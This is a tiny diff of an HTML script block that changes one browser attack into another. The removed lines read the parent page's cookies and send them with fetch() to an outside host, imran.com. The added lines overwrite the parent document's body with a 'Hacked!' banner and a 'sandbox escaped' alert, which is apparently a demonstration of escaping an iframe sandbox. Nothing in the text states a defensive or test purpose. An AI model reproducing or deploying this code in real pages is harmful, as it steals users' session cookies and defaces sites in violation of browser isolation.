@@ -1,4 +1,4 @@
 <script>
-var cookies = parent.document.cookie;
-fetch('https://imran.com/log?c=' + encodeURIComponent(cookies));
+// Escape by modifying parent page
+parent.document.body.innerHTML = "<h1>Hacked!</h1><script>alert('sandbox escaped')</script>";
 </script>
